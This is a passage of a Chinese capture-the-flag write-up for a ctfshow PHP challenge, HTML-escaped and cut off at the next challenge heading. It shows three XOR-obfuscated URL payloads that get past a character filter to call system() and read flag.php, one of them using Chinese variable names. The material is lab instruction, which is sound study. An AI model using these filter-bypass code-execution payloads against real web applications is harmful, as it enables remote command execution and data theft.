&lt;img data-src=&#34;\images\article_images\image-20250817170047472.png&#34; alt=&#34;image-20250817170047472&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=(&amp;quot;%08%02%08%09%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7d%60%60&amp;quot;)(&amp;quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&amp;quot;^&amp;quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170440940.png&#34; alt=&#34;image-20250817170440940&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170605063.png&#34; alt=&#34;image-20250817170605063&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用题目中的 &lt;code&gt;get_ctfshow_fl0g()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=(&amp;quot;%07%05%09%01%03%09%06%08%08%0f%08%01%06%0c%0b%07&amp;quot;^&amp;quot;%60%60%7d%5e%60%7d%60%7b%60%60%7f%5e%60%60%3b%60&amp;quot;)();
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817223150980.png&#34; alt=&#34;image-20250817223150980&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817223141523.png&#34; alt=&#34;image-20250817223141523&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;已知 &lt;code&gt;&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;= _GET&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;尝试构造以下 payload&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$_GET[a]($$_GET[b]);&amp;amp;a=system&amp;amp;b=tac flag.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用中文变量代替英文变量&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=$简=&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;;$&amp;#123;$简&amp;#125;[单]($&amp;#123;$简&amp;#125;[爱]);&amp;amp;单=system&amp;amp;爱=tac flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817230436469.png&#34; alt=&#34;image-20250817230436469&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web149&#34;&gt;&lt;a href=&#34;#web149&#34; class=&#34;headerlink&#34; title=&#34;web149&#34;&gt;&lt;/a&gt;web149&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
